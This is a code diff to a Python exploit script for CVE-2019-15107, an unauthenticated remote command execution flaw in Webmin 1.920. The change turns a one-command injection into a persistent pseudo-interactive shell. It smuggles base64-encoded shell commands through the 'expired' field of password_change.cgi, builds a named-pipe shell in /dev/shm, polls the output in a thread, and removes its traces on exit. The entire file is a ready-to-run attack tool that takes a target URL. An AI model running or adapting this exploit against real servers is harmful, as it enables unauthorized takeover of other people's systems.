@@ -1,14 +1,24 @@
 import requests
 import argparse
+import base64
 import re
+import threading
+import time
 
 class Webmin():
     def __init__(self,target):
         self.target = target
+        self.input = "/dev/shm/input"
+        self.output = "/dev/shm/output"
         self.url = self.url_fix()
-        self.exploit()
-        
+        self.makefifo()
 
+        self.thread = threading.Thread(target=self.readoutput, args=())
+        self.thread.daemon = True
+        self.thread.start()
+
+        self.write_cmd()
+        
     def url_fix(self):
         check = self.target[-1]
         if check == "/": 
@@ -17,7 +27,55 @@ class Webmin():
             fixed_url = self.target + "/"
             return fixed_url
 
-    def exploit(self):
+    def base64encode(self,string):
+        string_bytes = string.encode("ascii")
+        base64_bytes = base64.b64encode(string_bytes)
+        base64_string = base64_bytes.decode("ascii")
+
+        return base64_string
+
+    def makefifo(self):
+        make_fifo = "mkfifo " + self.input + "; tail -f " + self.input + " | /bin/sh 2>&1 > " + self.output
+        make_fifo_encoded = self.base64encode(make_fifo)
+        self.exploit(make_fifo_encoded)
+
+    def exploit(self,cmd):
+        requests.packages.urllib3.disable_warnings()
+        pass_change_url = self.url + "password_change.cgi"
+        referer_url = self.url + "session_login.cgi"
+
+        exploit_headers = {
+            "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1;",
+            "Referer": referer_url
+        }
+
+        post_data = {
+            "user":"bababooey",
+            "pam":"",
+            "expired":"2 | echo '';echo " + cmd + " | base64 -d | sh" 
+        }
+
+        try: 
+            req_site = requests.post(pass_change_url,data=post_data,headers=exploit_headers,verify=False,timeout=1)
+            search = re.compile(r"chosen.\s+(.*?)</p>",re.DOTALL)
+            cmd_text = search.search(req_site.text).group(1)
+            return cmd_text.strip()
+        except:
+            pass
+    
+    def readoutput(self):
+        read_file = "/bin/cat " + self.output
+        read_file_encoded = self.base64encode(read_file)
+        while True:
+            output = self.exploit(read_file_encoded) 
+            if output:
+                print(output)
+                clear_file = "echo -n '' > " + self.output
+                clear_file_encoded = self.base64encode(clear_file)
+                self.exploit(clear_file_encoded)
+            time.sleep(1)
+
+    def write_cmd(self):
         requests.packages.urllib3.disable_warnings()
         print("CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution")
         print("Getting shell on target " + self.url)
@@ -31,27 +89,30 @@ class Webmin():
         }
 
         while True:
-            cmd = input("RCE: ")
-            post_data = {
-                "user":"bababooey",
-                "pam":"",
-                "expired":"2 | echo '';" + cmd 
-            }
+            try:
+                cmd = input("RCE: ")
+                cmd= cmd + "\n"
+                cmd_encoded = self.base64encode(cmd)
+                post_data = {
+                    "user":"bababooey",
+                    "pam":"",
+                    "expired":"2 | echo '';echo " + cmd_encoded + " | base64 -d > " + self.input 
+                }
 
-            req_site = requests.post(pass_change_url,data=post_data,headers=exploit_headers,verify=False)
-            search = re.compile(r"chosen.\s+(.*?)</p>",re.DOTALL) 
-            cmd_text = search.search(req_site.text).group(1)
-            print(cmd_text)
+                requests.post(pass_change_url,data=post_data,headers=exploit_headers,verify=False)
+                time.sleep(2.5)
 
+            except KeyboardInterrupt:
+                remove_files = "rm " + self.input + ";rm " + self.output
+                remove_files_encoded = self.base64encode(remove_files)
+                self.exploit(remove_files_encoded)
+                print("\nBye Bye!")
+                exit()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution')
-
     parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://webmin.site/', required=True)
     args = parser.parse_args()
     
-    try:
-        Webmin(args.t)
-    except KeyboardInterrupt:
-        print("Bye Bye!")
-        exit()
+    Webmin(args.t)
+    
